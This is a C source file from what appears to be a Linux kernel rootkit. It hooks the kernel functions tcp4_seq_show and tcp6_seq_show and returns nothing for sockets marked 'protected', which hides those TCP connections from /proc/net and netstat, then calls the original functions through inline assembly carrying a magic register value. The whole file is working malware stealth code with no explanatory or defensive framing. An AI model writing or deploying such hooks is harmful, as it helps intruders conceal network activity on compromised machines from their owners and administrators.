#include "../inc/cmds.h"
#include "../inc/hooks.h"
#include "../inc/util.h"

#include <net/sock.h>

void *_tcp4_seq_show = NULL;
void *_tcp6_seq_show = NULL;

asmlinkage int32_t h_tcp4_seq_show(struct seq_file *seq, void *v) {
  int32_t ret = 0;
  hfind(_tcp4_seq_show, "tcp4_seq_show");

  if (SEQ_START_TOKEN != v)
    debg("current socket inode: %lu", inode_from_sock(v));

  if (is_inode_protected(inode_from_sock(v)))
    return 0;

  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "mov %3, %%rsi;"
      "call *%4;"
      "mov %%eax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "r"(seq), "r"(v), "m"(_tcp4_seq_show)
      : "%r15", "%rdi", "%rsi", "%rax");

  return ret;
}

asmlinkage int32_t h_tcp6_seq_show(struct seq_file *seq, void *v) {
  int32_t ret = 0;
  hfind(_tcp6_seq_show, "tcp6_seq_show");

  if (SEQ_START_TOKEN != v)
    debg("current socket inode: %lu", inode_from_sock(v));

  if (is_inode_protected(inode_from_sock(v)))
    return 0;

  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "mov %3, %%rsi;"
      "call *%4;"
      "mov %%eax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "r"(seq), "r"(v), "m"(_tcp6_seq_show)
      : "%r15", "%rdi", "%rsi", "%rax");

  return ret;
}
